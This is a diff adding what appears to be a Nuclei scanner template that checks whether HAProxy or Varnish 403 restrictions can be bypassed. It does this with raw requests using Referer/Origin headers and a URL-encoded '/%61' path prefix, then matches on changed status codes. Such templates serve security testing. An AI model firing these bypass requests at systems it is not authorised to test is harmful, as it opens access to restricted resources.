@@ -1,0 +1,42 @@
+id: haproxy-varnish-reverse-4xx-bypass
+
+info:
+  name: haproxy-varnish-4xx-bypass
+  author: aufzayed
+  severity: info
+  description: haproxy and varnish 4xx bypass
+  tags: fuzz
+
+requests:
+  - raw:
+    - |+
+      GET {{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Connection: Close
+
+    - |+
+      GET {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /%61{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+      
+    unsafe: true
+    redirects: true
+    req-condition: true
+    threads: 10
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 403 && status_code_2 != 403"
+          - "status_code_1 == 403 && status_code_3 != 403"
